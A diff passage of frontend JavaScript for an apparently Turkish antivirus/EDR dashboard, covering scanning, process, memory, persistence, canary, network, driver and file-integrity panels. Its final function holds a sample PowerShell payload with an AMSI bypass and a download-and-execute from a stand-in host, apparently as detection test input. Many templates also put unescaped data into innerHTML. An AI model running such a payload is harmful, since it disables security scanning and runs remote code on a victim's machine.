+                const cont = document.getElementById('engine-container');
+                cont.innerHTML = '';
+                data.engines.forEach(eng => {
+                    const div = document.createElement('div');
+                    div.className = 'engine-card';
+                    div.innerHTML = `
+                        <div class="engine-header">
+                            <div class="engine-name">&#10004; ${eng.name}</div>
+                            <span class="badge-status">${eng.status}</span>
+                        </div>
+                        <div class="engine-desc">${eng.description}</div>
+                    `;
+                    cont.appendChild(div);
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function startScan() {
+            const path = document.getElementById('scan-path').value.trim();
+            if (!path) {
+                alert('Lutfen taranacak bir dosya veya dizin yolu giriniz.');
+                return;
+            }
+
+            const btn = document.getElementById('scan-btn');
+            btn.innerHTML = '<span>&#8987;</span> Taraniyor...';
+            btn.disabled = true;
+
+            const quar = document.getElementById('scan-quar').checked;
+            const rec = document.getElementById('scan-recursive').checked;
+
+            try {
+                const res = await fetch('/api/scan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target: path, quarantine: quar, recursive: rec })
+                });
+                const data = await res.json();
+
+                if (data.error) {
+                    alert('Hata: ' + data.error);
+                    return;
+                }
+
+                document.getElementById('scan-results-box').style.display = 'block';
+                document.getElementById('res-scanned').innerText = data.scanned_files;
+                document.getElementById('res-infected').innerText = data.infected_files;
+                document.getElementById('res-bytes').innerText = (data.total_bytes / (1024 * 1024)).toFixed(2) + ' MB';
+                document.getElementById('res-time').innerText = data.elapsed_ms + ' ms';
+
+                const tbody = document.getElementById('scan-table-body');
+                tbody.innerHTML = '';
+
+                if (data.reports && data.reports.length > 0) {
+                    data.reports.forEach(r => {
+                        const tr = document.createElement('tr');
+                        const isInf = r.is_infected;
+                        const det = (r.detections && r.detections[0]) || {};
+                        const sev = det.severity || 'Clean';
+                        const pillClass = sev === 'Critical' ? 'pill-critical' : (sev === 'High' ? 'pill-high' : 'pill-clean');
+
+                        tr.innerHTML = `
+                            <td><strong style="color: #fff;">${r.file_path}</strong></td>
+                            <td><span style="color: ${isInf ? 'var(--rose)' : 'var(--emerald)'};">${det.threat_name || 'Temiz'}</span></td>
+                            <td>${det.engine_name || '-'}</td>
+                            <td><span class="pill ${pillClass}">${sev}</span></td>
+                            <td><span style="font-size: 11px; color: var(--text-muted);">${det.details || '-'}</span></td>
+                            <td>${r.quarantined ? '<span class="pill pill-clean">Karantinaya Alindi</span>' : (isInf ? '<span class="pill pill-critical">Aktif Zararli</span>' : '<span class="pill pill-clean">Temiz</span>')}</td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } else {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--emerald); padding: 25px;">
+                        Taranan hedefte hicbir tehdit bulunmadi. Sistem temiz.
+                    </td></tr>`;
+                }
+
+                showToast('Tarama basariyla tamamlandi!');
+                loadStatus();
+            } catch (e) {
+                alert('Tarama sirasinda hata olustu: ' + e);
+            } finally {
+                btn.innerHTML = '<span>&#128269;</span> Taramayi Baslat';
+                btn.disabled = false;
+            }
+        }
+
+        async function triggerUpdate() {
+            showToast('Tehdit istihbarati kaynaklari senkronize ediliyor...');
+            try {
+                const res = await fetch('/api/update', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Yeni imzalar ve YARA kurallari basariyla yuklendi!');
+                    loadStatus();
+                } else {
+                    alert('Guncelleme hatasi: ' + data.error);
+                }
+            } catch (e) {
+                alert('Guncelleme istegi basarisiz: ' + e);
+            }
+        }
+
+        async function loadProcesses() {
+            const tbody = document.getElementById('proc-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--cyan); padding: 30px;">
+                Calisan tum surecler taranıyor, lutfen bekleyiniz...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/processes');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                if (!data.processes || data.processes.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--emerald); padding: 30px;">
+                        Calisan hicbir surecte tehdit veya supheli komut satiri tespit edilmedi. Sistem temiz.
+                    </td></tr>`;
+                    return;
+                }
+
+                data.processes.forEach(p => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><strong>${p.pid}</strong></td>
+                        <td>${p.name}</td>
+                        <td><span style="font-size: 11px;">${p.exe_path || 'Bilinmiyor'}</span></td>
+                        <td><code>${p.cmd || '-'}</code></td>
+                        <td><span class="pill ${p.threat_count > 0 ? 'pill-critical' : 'pill-clean'}">${p.threat_count} Tehdit</span></td>
+                        <td>
+                            <button class="btn-danger" onclick="killProc(${p.pid})">Sonlandir (Kill)</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                alert('Surec tarama hatasi: ' + e);
+            }
+        }
+
+        async function killProc(pid) {
+            if (!confirm(`PID ${pid} surecini zorla sonlandirmak istediginize emin misiniz?`)) return;
+            try {
+                const res = await fetch('/api/process/kill', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ pid })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast(`PID ${pid} sureci basariyla sonlandirildi.`);
+                    loadProcesses();
+                } else {
+                    alert('Surec sonlandirilamadi: ' + (d.error || 'Erisim Reddedildi'));
+                }
+            } catch (e) {
+                alert('Istek hatasi: ' + e);
+            }
+        }
+
+        async function loadMemory() {
+            const tbody = document.getElementById('mem-table-body');
+            tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--purple); padding: 30px;">
+                Canli surec bellekleri taranıyor (RWX ve Unbacked Private sayfalar), lutfen bekleyiniz...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/memory');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                const reports = data.reports || [];
+                document.getElementById('mem-scanned-count').innerText = reports.length > 0 ? reports.length : 'Temiz';
+                document.getElementById('mem-threat-count').innerText = reports.length;
+
+                if (reports.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--emerald); padding: 30px;">
+                        Hicbir surecte supheli RWX veya enjekte bellek sayfasi tespit edilmedi. Sistem temiz.
+                    </td></tr>`;
+                    return;
+                }
+
+                reports.forEach(r => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><strong style="color: #fff;">${r.process_name}</strong></td>
+                        <td><code>${r.pid}</code></td>
+                        <td><code style="color: var(--cyan);">${r.region_address}</code></td>
+                        <td>${(r.region_size / 1024).toFixed(0)} KB</td>
+                        <td><span class="pill pill-purple">${r.protection}</span></td>
+                        <td><span class="pill pill-critical">${r.threat_type}</span></td>
+                        <td><span style="font-size: 11px; color: var(--text-muted);">${r.details}</span></td>
+                        <td>
+                            <button class="btn-danger" onclick="killProc(${r.pid})">Sonlandir</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                alert('Bellek tarama hatasi: ' + e);
+            }
+        }
+
+        async function loadUsb() {
+            const tbody = document.getElementById('usb-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--cyan); padding: 30px;">
+                Takili cikarilabilir suruculer kontrol ediliyor...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/usb');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                const drives = data.drives || [];
+                if (drives.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                        Takili cikarilabilir (USB) surucu bulunamadi. Yukaridaki alandan ozel bir surucu yolu girebilirsiniz.
+                    </td></tr>`;
+                    return;
+                }
+
+                drives.forEach(d => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><strong>${d.drive_path}</strong></td>
+                        <td><span class="badge-status">${d.drive_type}</span></td>
+                        <td>${d.scanned_files}</td>
+                        <td><span class="pill ${d.infected_count > 0 ? 'pill-critical' : 'pill-clean'}">${d.infected_count} Tehdit</span></td>
+                        <td><span style="font-size: 11px;">${d.threats.length > 0 ? d.threats[0].details : 'Guvenli'}</span></td>
+                        <td><span class="pill ${d.infected_count > 0 ? 'pill-critical' : 'pill-clean'}">${d.infected_count > 0 ? 'Tehlike' : 'Temiz'}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                alert('USB tarama hatasi: ' + e);
+            }
+        }
+
+        async function scanCustomUsb() {
+            const p = document.getElementById('usb-custom-path').value.trim();
+            if (!p) {
+                alert('Lutfen taranacak bir surucu yolu giriniz.');
+                return;
+            }
+
+            const tbody = document.getElementById('usb-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--cyan); padding: 30px;">
+                ${p} surucusu taranıyor...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/usb/scan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path: p, quarantine: true })
+                });
+                const d = await res.json();
+                tbody.innerHTML = '';
+
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td><strong>${d.drive_path}</strong></td>
+                    <td><span class="badge-status">${d.drive_type}</span></td>
+                    <td>${d.scanned_files}</td>
+                    <td><span class="pill ${d.infected_count > 0 ? 'pill-critical' : 'pill-clean'}">${d.infected_count} Tehdit</span></td>
+                    <td><span style="font-size: 11px;">${d.threats && d.threats.length > 0 ? d.threats[0].details : 'Guvenli'}</span></td>
+                    <td><span class="pill ${d.infected_count > 0 ? 'pill-critical' : 'pill-clean'}">${d.infected_count > 0 ? 'Zararli Temizlendi' : 'Temiz'}</span></td>
+                `;
+                tbody.appendChild(tr);
+                showToast('Surucu taramasi tamamlandi.');
+            } catch (e) {
+                alert('Tarama hatasi: ' + e);
+            }
+        }
+
+        async function loadPersistence() {
+            const tbody = document.getElementById('persist-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--cyan); padding: 30px;">
+                Kalicilik noktalari (Run anahtarlari, Startup klasoru, Zamanlanmis Gorevler) taranıyor...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/persistence');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                if (!data.entries || data.entries.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--emerald); padding: 30px;">
+                        Hicbir kalicilik girisi bulunamadi veya sistem temiz.
+                    </td></tr>`;
+                    return;
+                }
+
+                data.entries.forEach(e => {
+                    const tr = document.createElement('tr');
+                    const isSusp = e.is_suspicious;
+                    const pillClass = e.severity === 'Critical' ? 'pill-critical' : (e.severity === 'High' ? 'pill-high' : 'pill-clean');
+
+                    tr.innerHTML = `
+                        <td><strong style="color: var(--cyan);">${e.location}</strong></td>
+                        <td>${e.name}</td>
+                        <td><code style="font-size: 11px;">${e.command}</code></td>
+                        <td><span style="font-size: 11px;">${e.target_path || '-'}</span></td>
+                        <td><span class="pill ${pillClass}">${e.severity}</span></td>
+                        <td><span style="font-size: 11px; color: ${isSusp ? 'var(--rose)' : 'var(--text-muted)'};">${e.threat_details || 'Guvenli'}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                alert('Kalicilik tarama hatasi: ' + e);
+            }
+        }
+
+        async function loadCanary() {
+            try {
+                const res = await fetch('/api/canary');
+                const data = await res.json();
+
+                document.getElementById('canary-total-stat').innerText = data.total_deployed || 0;
+                document.getElementById('canary-tampered-stat').innerText = data.compromised_count || 0;
+                
+                const statusEl = document.getElementById('canary-status-stat');
+                if (data.compromised_count > 0) {
+                    statusEl.innerText = 'FIDYE SALDIRISI!';
+                    statusEl.style.color = 'var(--rose)';
+                } else {
+                    statusEl.innerText = 'Guvende';
+                    statusEl.style.color = 'var(--emerald)';
+                }
+
+                const tbody = document.getElementById('canary-table-body');
+                tbody.innerHTML = '';
+
+                if (!data.files || data.files.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 25px;">
+                        Henuz hicbir yem dosyasi kurulmamis. Yukaridaki alandan yemleri kurabilirsiniz.
+                    </td></tr>`;
+                    return;
+                }
+
+                data.files.forEach(f => {
+                    const tr = document.createElement('tr');
+                    const isTampered = f.is_compromised || (f.status && f.status.toLowerCase().includes('bozul'));
+                    const pillClass = isTampered ? 'pill-critical' : 'pill-clean';
+
+                    tr.innerHTML = `
+                        <td><strong style="color: #fff;">${f.filename}</strong></td>
+                        <td><span style="font-size: 11px;">${f.path}</span></td>
+                        <td><code style="font-size: 10px;">${f.initial_sha256 ? f.initial_sha256.substring(0, 16) + '...' : '-'}</code></td>
+                        <td>${f.deployed_at ? f.deployed_at.split('T')[0] : 'Aktif'}</td>
+                        <td><span class="pill ${pillClass}">${f.status}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function deployCanary() {
+            const dir = document.getElementById('canary-target-dir').value.trim();
+            if (!dir) {
+                alert('Lutfen yemlerin yerlestirilecegi dizini giriniz.');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/canary/deploy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_dir: dir })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast(`${d.deployed_count} adet fidye yem dosyasi basariyla yerlestirildi.`);
+                    loadCanary();
+                } else {
+                    alert('Yem kurma hatasi: ' + d.error);
+                }
+            } catch (e) {
+                alert('Istek hatasi: ' + e);
+            }
+        }
+
+        async function loadNetwork() {
+            const tbody = document.getElementById('network-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--cyan); padding: 30px;">
+                Aktif TCP soketleri ve C2 arka kapi portlari taranıyor...
+            </td></tr>`;
+
+            try {
+                const res = await fetch('/api/network');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                if (!data.connections || data.connections.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--emerald); padding: 30px;">
+                        Aktif TCP baglantisi bulunamadi veya sistem temiz.
+                    </td></tr>`;
+                    return;
+                }
+
+                data.connections.forEach(c => {
+                    const tr = document.createElement('tr');
+                    const isSusp = c.is_suspicious;
+                    const pillClass = isSusp ? 'pill-critical' : 'pill-clean';
+
+                    tr.innerHTML = `
+                        <td><code>${c.local_addr}</code></td>
+                        <td>
+                            <code style="color: ${isSusp ? 'var(--rose)' : 'var(--cyan)'};">${c.foreign_addr}</code>
+                            ${c.threat_details ? `<div style="font-size: 11px; color: var(--rose); margin-top: 3px;">${c.threat_details}</div>` : ''}
+                        </td>
+                        <td><span style="font-size: 11px;">${c.state}</span></td>
+                        <td><strong>${c.process_name}</strong></td>
+                        <td>${c.pid}</td>
+                        <td><span class="pill ${pillClass}">${isSusp ? 'Supheli C2' : 'Guvenli'}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                alert('Ag tarama hatasi: ' + e);
+            }
+        }
+
+        async function loadDefenderInfo(showToastMsg = false) {
+            try {
+                const res = await fetch('/api/defender');
+                const def = await res.json();
+
+                const badge = document.getElementById('sidebar-defender-text');
+                if (badge) {
+                    badge.innerText = def.realtime_protection_enabled ? 'Defender: Dual-Layer OK' : 'Defender: Kısmi';
+                }
+
+                const defVal = document.getElementById('stat-defender-val');
+                const defDesc = document.getElementById('stat-defender-desc');
+                if (defVal) {
+                    defVal.innerText = def.realtime_protection_enabled ? 'Aktif & Eşzamanlı' : 'Devre Dışı';
+                    defVal.style.color = def.realtime_protection_enabled ? 'var(--emerald)' : 'var(--rose)';
+                }
+                if (defDesc) {
+                    defDesc.innerText = `İmza: ${def.antivirus_signature_age} günlük | RTP: ${def.realtime_protection_enabled ? 'Açık' : 'Kapalı'}`;
+                }
+
+                const pill = document.getElementById('banner-defender-pill');
+                if (pill) {
+                    pill.innerText = def.is_dual_layer_active ? 'Dual-Layer Aktif' : 'Tek Katmanlı';
+                }
+                const age = document.getElementById('banner-defender-age');
+                if (age) {
+                    age.innerText = def.antivirus_signature_age === 0 ? 'Bugün güncellendi (0 gün)' : `${def.antivirus_signature_age} gün önce`;
+                }
+                const det = document.getElementById('banner-defender-details');
+                if (det) {
+                    det.innerText = `${def.notes} (Antispyware: ${def.antispyware_enabled ? 'Aktif' : 'Pasif'}, IOAV: ${def.ioav_protection_enabled ? 'Aktif' : 'Pasif'})`;
+                }
+
+                if (showToastMsg) {
+                    showToast('Windows Defender telemetrisi başarıyla güncellendi.');
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function loadLolbas() {
+            const btn = document.getElementById('btn-lolbas-scan');
+            if (btn) {
+                btn.innerHTML = '<span>&#8987;</span> LOLBAS Taranıyor...';
+                btn.disabled = true;
+            }
+
+            const tbody = document.getElementById('lolbas-table-body');
+            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:30px; color:var(--cyan);">Çalışan tüm süreçler, parametreler ve ebeveyn hiyerarşisi taranıyor...</td></tr>';
+
+            try {
+                const res = await fetch('/api/lolbas');
+                const data = await res.json();
+                const reports = data.reports || [];
+
+                document.getElementById('lolbas-threat-count').innerText = reports.length;
+                const macroCount = reports.filter(r => r.category.includes('Makro') || r.category.includes('Ofis')).length;
+                document.getElementById('lolbas-macro-count').innerText = macroCount;
+
+                const statusBadge = document.getElementById('lolbas-status-badge');
+                if (reports.length > 0) {
+                    statusBadge.innerText = 'Şüpheli / Riskli';
+                    statusBadge.style.color = 'var(--rose)';
+                } else {
+                    statusBadge.innerText = 'Temiz';
+                    statusBadge.style.color = 'var(--emerald)';
+                }
+
+                tbody.innerHTML = '';
+                if (reports.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--emerald); padding: 30px;">
+                        [OK] Sistemde şüpheli LOLBAS (Living Off The Land) aktivitesi veya anormal süreç tetiklemesi bulunmadı.
+                    </td></tr>`;
+                } else {
+                    reports.forEach(r => {
+                        const tr = document.createElement('tr');
+                        const pillClass = r.severity === 'Critical' ? 'pill-critical' : (r.severity === 'High' ? 'pill-high' : 'pill-purple');
+                        tr.innerHTML = `
+                            <td><strong style="color: #fff;">${r.name}</strong></td>
+                            <td><span class="pill pill-purple">${r.pid}</span></td>
+                            <td><span style="color: var(--cyan);">${r.parent_name}</span> <span style="font-size:10px; color:var(--text-muted);">(PPID: ${r.parent_pid || '-'})</span></td>
+                            <td><strong style="color: var(--rose); font-size: 11.5px;">${r.category}</strong></td>
+                            <td><span class="pill pill-high">${r.mitre_id}</span></td>
+                            <td><span class="pill ${pillClass}">${r.severity}</span></td>
+                            <td>
+                                <div style="font-size: 11.5px; color: #fff; margin-bottom: 3px;">${r.description}</div>
+                                <div style="font-size: 10.5px; color: var(--text-muted); font-family: monospace; max-width: 320px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${r.cmd}">
+                                    ${r.cmd || '-'}
+                                </div>
+                            </td>
+                            <td>
+                                <button class="btn-danger" onclick="killLolbasProc(${r.pid})">
+                                    Sonlandır (Kill)
+                                </button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                }
+                showToast('LOLBAS taraması tamamlandı!');
+            } catch (e) {
+                tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; color:var(--rose); padding:20px;">Hata: ${e}</td></tr>`;
+            } finally {
+                if (btn) {
+                    btn.innerHTML = '<span>&#128737;</span> LOLBAS Taraması Başlat';
+                    btn.disabled = false;
+                }
+            }
+        }
+
+        async function killLolbasProc(pid) {
+            if (!confirm(`PID ${pid} sürecini zorla sonlandırmak istediğinize emin misiniz?`)) return;
+            try {
+                const res = await fetch('/api/process/kill', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ pid })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast(`PID ${pid} süreci başarıyla sonlandırıldı!`);
+                    loadLolbas();
+                } else {
+                    alert(`Süreç sonlandırılamadı: ${d.message || d.error}`);
+                }
+            } catch (e) {
+                alert('İstek başarısız: ' + e);
+            }
+        }
+
+        async function loadQuarantine() {
+            try {
+                const res = await fetch('/api/quarantine');
+                const data = await res.json();
+                const tbody = document.getElementById('quar-table-body');
+                tbody.innerHTML = '';
+
+                if (!data.entries || data.entries.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: var(--emerald); padding: 25px;">
+                        Karantina kasasi temiz. Hicbir dosya bulunmuyor.
+                    </td></tr>`;
+                    return;
+                }
+
+                data.entries.forEach(e => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><code>${e.id}</code></td>
+                        <td><strong style="color: var(--rose);">${e.threat_name}</strong></td>
+                        <td><span style="color: var(--cyan);">${e.detected_engine}</span></td>
+                        <td><span style="font-size: 11px; word-break: break-all;">${e.original_path}</span></td>
+                        <td>${e.file_size} B</td>
+                        <td>${e.date.split('T')[0]}</td>
+                        <td>
+                            <button class="btn-restore" onclick="restoreQuar('${e.id}')">Geri Yukle</button>
+                            <button class="btn-danger" onclick="deleteQuar('${e.id}')" style="margin-left: 6px;">Sil</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function restoreQuar(id) {
+            if (!confirm('Bu dosyayi orijinal konumuna geri yuklemek istediginize emin misiniz?')) return;
+            const res = await fetch('/api/quarantine/restore', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id })
+            });
+            const d = await res.json();
+            if (d.success) {
+                showToast('Dosya basariyla geri yuklendi: ' + d.restored_path);
+                loadQuarantine();
+                loadStatus();
+            } else {
+                alert('Geri yukleme hatasi: ' + d.error);
+            }
+        }
+
+        async function deleteQuar(id) {
+            if (!confirm('Bu dosyayi kalici olarak silmek istediginize emin misiniz?')) return;
+            const res = await fetch('/api/quarantine/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id })
+            });
+            const d = await res.json();
+            if (d.success) {
+                showToast('Karantinadaki dosya kalici olarak silindi.');
+                loadQuarantine();
+                loadStatus();
+            } else {
+                alert('Silme hatasi: ' + d.error);
+            }
+        }
+
+        async function loadDrivers() {
+            const tbody = document.getElementById('drivers-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:25px; color:var(--cyan);">Sistem sürücüleri ve hazırlık alanları taranıyor...</td></tr>`;
+            try {
+                const res = await fetch('/api/drivers');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                if (data.error) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--rose); padding:20px;">Hata: ${data.error}</td></tr>`;
+                    return;
+                }
+
+                const threats = data.drivers || [];
+                const countEl = document.getElementById('stat-drivers-count');
+                const descEl = document.getElementById('stat-drivers-desc');
+
+                if (threats.length === 0) {
+                    countEl.innerText = 'Temiz';
+                    countEl.style.color = 'var(--emerald)';
+                    descEl.innerText = 'Hiçbir savunmasız sürücü bulunamadı';
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--emerald); padding:25px; font-weight:600;">
+                        &#10004; Sistem temiz. C:\\Windows\\System32\\drivers ve geçici dizinlerde savunmasız/zararlı sürücü tespit edilmedi.
+                    </td></tr>`;
+                    return;
+                }
+
+                countEl.innerText = threats.length + ' Tehdit';
+                countEl.style.color = 'var(--rose)';
+                descEl.innerText = 'Acil inceleme önerilir!';
+
+                threats.forEach(t => {
+                    const tr = document.createElement('tr');
+                    const stagingBadge = t.is_staging
+                        ? `<span class="badge-status" style="background:rgba(244,63,94,0.15); color:var(--rose); border-color:rgba(244,63,94,0.3); margin-top:4px; display:inline-block;">STAGING (Geçici Dizin)</span>`
+                        : `<span style="font-size:11px; color:var(--text-muted); display:inline-block; margin-top:2px;">Sistem Sürücüsü</span>`;
+                    const sevBadge = t.severity === 'Critical'
+                        ? `<span class="badge-status" style="background:rgba(244,63,94,0.15); color:var(--rose); border-color:rgba(244,63,94,0.3); font-weight:700;">CRITICAL</span>`
+                        : `<span class="badge-status" style="background:rgba(245,158,11,0.15); color:var(--amber); border-color:rgba(245,158,11,0.3); font-weight:700;">HIGH</span>`;
+
+                    tr.innerHTML = `
+                        <td><strong style="color:#fff;">${t.driver_name}</strong></td>
+                        <td>${sevBadge}</td>
+                        <td><span style="color:var(--amber); font-weight:600;">${t.cve || 'LOLDrivers Kuralı'}</span></td>
+                        <td><div style="font-size:11px; word-break:break-all;">${t.driver_path}</div>${stagingBadge}</td>
+                        <td><code style="font-size:10.5px;">${t.sha256.substring(0, 16)}...</code></td>
+                        <td><span style="font-size:11.5px; color:var(--text-muted);">${t.description}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+                showToast(`Sürücü taraması tamamlandı: ${threats.length} tehdit.`);
+            } catch (e) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--rose); padding:20px;">Bağlantı hatası: ${e}</td></tr>`;
+            }
+        }
+
+        async function checkFimStatus() {
+            try {
+                const res = await fetch('/api/fim/status');
+                const data = await res.json();
+                if (data.items) {
+                    document.getElementById('stat-fim-monitored').innerText = data.items.length + ' Dosya';
+                }
+            } catch (e) {
+                console.error(e);
+            }
+            checkFim();
+        }
+
+        async function initFim() {
+            if (!confirm('Kritik sistem dosyaları için yeni SHA-256 referans (baseline) kaydı oluşturulsun mu?')) return;
+            try {
+                const res = await fetch('/api/fim/init', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`Kriptografik referans oluşturuldu: ${data.items ? data.items.length : 0} dosya.`);
+                    checkFim();
+                } else {
+                    alert('Referans oluşturma hatası: ' + data.error);
+                }
+            } catch (e) {
+                alert('İstek hatası: ' + e);
+            }
+        }
+
+        async function checkFim() {
+            const tbody = document.getElementById('fim-table-body');
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:25px; color:var(--cyan);">Kritik sistem dosyaları doğrulanıyor...</td></tr>`;
+            try {
+                const res = await fetch('/api/fim/check');
+                const data = await res.json();
+                tbody.innerHTML = '';
+
+                if (data.error) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--rose); padding:20px;">Hata: ${data.error}</td></tr>`;
+                    return;
+                }
+
+                const reports = data.reports || [];
+                let tamperedCount = 0;
+                document.getElementById('stat-fim-monitored').innerText = reports.length + ' Dosya';
+
+                reports.forEach(r => {
+                    const tr = document.createElement('tr');
+                    let statusBadge = '';
+                    if (r.status.includes('Intact') || r.status.includes('Bozulmam')) {
+                        statusBadge = `<span class="badge-status" style="background:rgba(16,185,129,0.15); color:var(--emerald); border-color:rgba(16,185,129,0.3);">&#10004; BOZULMAMIŞ (INTACT)</span>`;
+                    } else if (r.status.includes('Tampered') || r.status.includes('Değiştir')) {
+                        tamperedCount++;
+                        statusBadge = `<span class="badge-status" style="background:rgba(244,63,94,0.15); color:var(--rose); border-color:rgba(244,63,94,0.3); font-weight:700;">&#9888; DEĞİŞTİRİLMİŞ</span>`;
+                    } else if (r.status.includes('Deleted') || r.status.includes('Silin') || r.status.includes('Eksik')) {
+                        tamperedCount++;
+                        statusBadge = `<span class="badge-status" style="background:rgba(245,158,11,0.15); color:var(--amber); border-color:rgba(245,158,11,0.3); font-weight:700;">&#10006; DOSYA YOK</span>`;
+                    } else {
+                        statusBadge = `<span class="badge-status" style="background:rgba(245,158,11,0.15); color:var(--amber); border-color:rgba(245,158,11,0.3);">${r.status}</span>`;
+                    }
+
+                    const curHash = r.current_hash ? `<code style="font-size:10.5px;">${r.current_hash.substring(0, 16)}...</code>` : '<span style="color:var(--text-muted);">-</span>';
+                    const baseHash = r.baseline_hash ? `<code style="font-size:10.5px;">${r.baseline_hash.substring(0, 16)}...</code>` : '<span style="color:var(--text-muted);">-</span>';
+
+                    tr.innerHTML = `
+                        <td><strong style="color:#fff; font-size:12px; word-break:break-all;">${r.path}</strong></td>
+                        <td><span style="font-size:11.5px; color:var(--text-muted);">${r.description}</span></td>
+                        <td>${statusBadge}</td>
+                        <td><span style="font-size:11px; font-weight:600; color:${r.severity === 'Critical' ? 'var(--rose)' : (r.severity === 'High' ? 'var(--amber)' : 'var(--emerald)')};">${r.severity}</span></td>
+                        <td>${curHash}</td>
+                        <td>${baseHash}</td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+
+                const integEl = document.getElementById('stat-fim-integrity');
+                const integDesc = document.getElementById('stat-fim-integrity-desc');
+                const tampEl = document.getElementById('stat-fim-tampered');
+
+                if (tamperedCount > 0) {
+                    integEl.innerText = 'İHLAL TESPİT EDİLDİ';
+                    integEl.style.color = 'var(--rose)';
+                    integDesc.innerText = `${tamperedCount} adet dosyada yetkisiz değişiklik!`;
+                    tampEl.innerText = `${tamperedCount} İhlal`;
+                    tampEl.style.color = 'var(--rose)';
+                } else {
+                    integEl.innerText = 'Bütünlük Sağlam';
+                    integEl.style.color = 'var(--emerald)';
+                    integDesc.innerText = 'Kriptografik eşleşme tam';
+                    tampEl.innerText = '0 İhlal';
+                    tampEl.style.color = 'var(--emerald)';
+                }
+
+                showToast(`FIM Bütünlük denetimi tamamlandı. İhlal: ${tamperedCount}`);
+            } catch (e) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--rose); padding:20px;">Bağlantı hatası: ${e}</td></tr>`;
+            }
+        }
+
+        function loadSampleScript() {
+            const sample = `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$client = New-Object System.Net.WebClient
+$url = 'http://malware-drop.top/stage2.ps1'
+IEX $client.DownloadString($url)`;
